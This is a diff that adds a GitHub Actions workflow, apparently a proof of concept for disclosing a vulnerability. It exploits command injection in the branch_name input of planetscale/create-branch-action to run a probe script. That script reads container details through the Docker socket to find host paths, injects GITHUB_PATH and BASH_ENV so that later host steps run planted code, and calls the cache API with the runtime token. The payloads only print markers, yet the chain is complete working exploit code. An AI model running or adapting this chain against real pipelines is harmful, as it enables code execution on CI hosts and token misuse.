@@ -1,0 +1,85 @@
+name: poc6-hostexec
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  hostexec:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write probe4
+        run: |
+          cat > probe4.sh <<'PROBE'
+          #!/bin/sh
+          # RCE-E probe 4: (a) host-path GITHUB_PATH injection -> later host steps execute
+          # attacker binary, (b) BASH_ENV injection -> host code exec in every later bash
+          # step, (c) results-service cache write probe (scratch repo only; reservation is
+          # never completed so nothing is stored), (d) artifact backend URL discovery.
+          TAG="${1:-x}"
+          OUT="/github/workspace/escape2_${TAG}.txt"
+          SOCK=/var/run/docker.sock
+          
+          {
+          echo "########## ESCAPE2 PROBE tag=${TAG} ##########"
+          CJ=$(curl -s --max-time 8 --unix-socket "$SOCK" "http://localhost/containers/$(cat /etc/hostname)/json" 2>/dev/null)
+          HOSTWS=$(echo "$CJ" | tr ',' '\n' | grep -B1 '"Destination":"/github/workspace"' | grep '"Source"' | head -1 | sed 's/.*"Source":"\([^"]*\)".*/\1/')
+          HOSTTMP=$(echo "$CJ" | tr ',' '\n' | grep -B1 '"Destination":"/github/runner_temp"' | grep '"Source"' | head -1 | sed 's/.*"Source":"\([^"]*\)".*/\1/')
+          echo "host workspace path: $HOSTWS"
+          echo "host temp path: $HOSTTMP"
+          
+          # (a) GITHUB_PATH with the HOST path of the mounted temp dir + tool payload there
+          if [ -n "$HOSTTMP" ]; then
+            cat > /github/runner_temp/probe-tool <<'EOS'
+          #!/bin/sh
+          echo "HOST probe-tool executed: uid=$(id -u) user=$(id -un)"
+          EOS
+            chmod +x /github/runner_temp/probe-tool 2>&1
+            echo "$HOSTTMP" >> "$GITHUB_PATH" && echo "GITHUB_PATH(h) write: ok"
+            # (b) BASH_ENV -> every later non-interactive bash step sources this file
+            cat > /github/runner_temp/rcee-pwn.sh <<'EOS'
+          echo "BASH_ENV_SOURCED host-side: uid=$(id -u) user=$(id -un) cwd=$(pwd)"
+          EOS
+            echo "BASH_ENV=$HOSTTMP/rcee-pwn.sh" >> "$GITHUB_ENV" && echo "GITHUB_ENV BASH_ENV write: ok"
+            echo "RCE_E_MARKER2=second-injection" >> "$GITHUB_ENV"
+          fi
+          
+          # (c) cache write-scope probe with a 64-char version (twirp cache API)
+          V=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+          echo "== CreateCacheEntry (scratch repo, reservation only, nothing uploaded) =="
+          R2=$(curl -s -D /tmp/r2.hdr -o /tmp/r2.body -w '%{http_code}' --location-trusted --max-time 12 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' \
+            -X POST -d "{\"key\":\"rcee-probe-write\",\"version\":\"$V\"}" \
+            "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" 2>&1)
+          echo "CreateCacheEntry HTTP: $R2"
+          echo "body: $(head -c 260 /tmp/r2.body)"
+          echo "auth header echoed in body? $(grep -c 'eyJ' /tmp/r2.body 2>/dev/null)"
+          
+          # (d) artifact env discovery (URLs only)
+          echo "GITHUB_ARTIFACTS: $(echo "$GITHUB_ARTIFACTS" | head -c 90)"
+          echo "GITHUB_ARTIFACTS_LIST: $(echo "$GITHUB_ARTIFACTS_LIST" | head -c 90)"
+          echo "########## ESCAPE2 PROBE END tag=${TAG} ##########"
+          } >> "$OUT" 2>&1
+          exit 0
+          PROBE
+          chmod +x probe4.sh
+      - name: create-branch-action host-exec probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(sh /github/workspace/probe4.sh x2)end'
+          check_exists: "false"
+      - name: Print probe evidence
+        run: |
+          echo "--- escape2_x2.txt ---"
+          cat escape2_x2.txt || echo "no file"
+      - name: Later host step A (PATH + env check)
+        run: |
+          echo "RCE_E_MARKER2=$RCE_E_MARKER2"
+          command -v probe-tool && probe-tool || echo "probe-tool not found"
+      - name: Later host step B (plain)
+        run: echo "step B start"
